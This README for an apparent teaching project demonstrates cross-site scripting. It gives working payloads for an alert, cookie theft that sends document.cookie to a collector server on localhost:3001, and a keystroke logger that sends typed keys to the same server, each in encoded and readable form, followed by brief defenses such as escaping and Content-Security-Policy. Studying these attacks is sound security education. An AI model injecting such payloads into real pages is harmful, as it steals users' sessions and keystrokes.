# xss
A test project to demonstrate XSS attack


XSS
  simple html page to demonstrate xss
  script tag gets executed no matter where placed

  xss demo with search query parameter
  cookie stealing
  keypress monitoring


  encodeURIComponent('<img src="does-not-exist" onerror="alert(\'hi!\')">');

  cookie:
  encodeURIComponent('<img src="does-not-exist" onerror="alert(document.cookie)">')


  send cookie to evil server
  encodeURIComponent('<img src="does-not-exist" onerror="var img = document.createElement(\'img\'); img.src = \'http://localhost:3001/cookie?data=\' + document.cookie; document.querySelector(\'body\').appendChild(img);">')
      
      code in readable format
      var img = document.createElement('img');
      img.src = 'http://localhost:3001/cookie?data=' + document.cookie;
      document.querySelector('body').appendChild(img);

  add a key listener

  encodeURIComponent('<img src="does-not-exist" onerror="var timeout; var buffer = \'\'; document.querySelector(\'body\').addEventListener(\'keypress\', function(event) { if (event.which !== 0) { clearTimeout(timeout); buffer += String.fromCharCode(event.which); timeout = setTimeout(function() { var xhr = new XMLHttpRequest(); var uri = \'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer); xhr.open(\'GET\', uri); xhr.send(); buffer = \'\'; }, 400); } });">')

      key listener code in readable format

      var timeout;
      var buffer = '';
      document.querySelector('body').addEventListener('keypress', function(event) {
        if (event.which !== 0) {
          clearTimeout(timeout);
          buffer += String.fromCharCode(event.which);
          timeout = setTimeout(function() {
            var xhr = new XMLHttpRequest();
            var uri = 'http://localhost:3001/keys?data=' + encodeURIComponent(buffer);
            xhr.open('GET', uri);
            xhr.send();
            buffer = '';
          }, 400);
        }
      });    


beef xss framework - http://beefproject.com/
    The Browser Exploitation Framework. 


  XSS defenses
    1. Never put untrusted data directly in a  ascript, in a HTML comment or in an attribute name
    2. Escape data before putting it in HTML - most of the frameworks do this by default
    3. If you unescape, sanitize the data first 
    4. Content security policy
        Browsers can't tell the difference between scripts downloaded from your origin vs another. It is a single execution context.
        CSP allows us to tell modern browsers which sources they should trust, and for what types of resources

     Content-Security-Policy: script-src 'self' https://brighter.com

